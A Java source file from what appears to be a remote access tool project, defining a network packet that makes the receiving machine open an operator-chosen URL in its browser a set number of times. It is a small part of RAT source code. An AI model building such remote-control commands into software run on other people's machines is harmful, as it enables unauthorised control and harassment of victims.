/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.awt.Desktop;
import java.awt.Desktop.Action;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

import de.sogomn.rat.ActiveConnection;

public final class WebsitePacket implements IPacket {
	
	private String address;
	private int amount;
	
	private static final String HTTP_PREFIX = "http://";
	
	public WebsitePacket(final String address, final int amount) {
		this.amount = amount;
		
		final boolean hasPrefix = address.startsWith(HTTP_PREFIX);
		
		if (hasPrefix) {
			this.address = address;
		} else {
			this.address = HTTP_PREFIX + address;
		}
	}
	
	public WebsitePacket(final String address) {
		this(address, 1);
	}
	
	public WebsitePacket() {
		this("");
	}
	
	private void openWebsite(final String address) {
		final boolean desktopSupported = Desktop.isDesktopSupported();
		
		if (desktopSupported) {
			final Desktop desktop = Desktop.getDesktop();
			final boolean canBrowse = desktop.isSupported(Action.BROWSE);
			
			if (canBrowse) {
				try {
					final URI uri = new URI(address);
					
					desktop.browse(uri);
				} catch (final IOException | URISyntaxException ex) {
					ex.printStackTrace();
				}
			}
		}
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUtf(address);
		connection.writeInt(amount);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		address = connection.readUtf();
		amount = connection.readInt();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		for (int i = 0; i < amount; i++) {
			openWebsite(address);
		}
	}
	
	public String getAddress() {
		return address;
	}
	
}
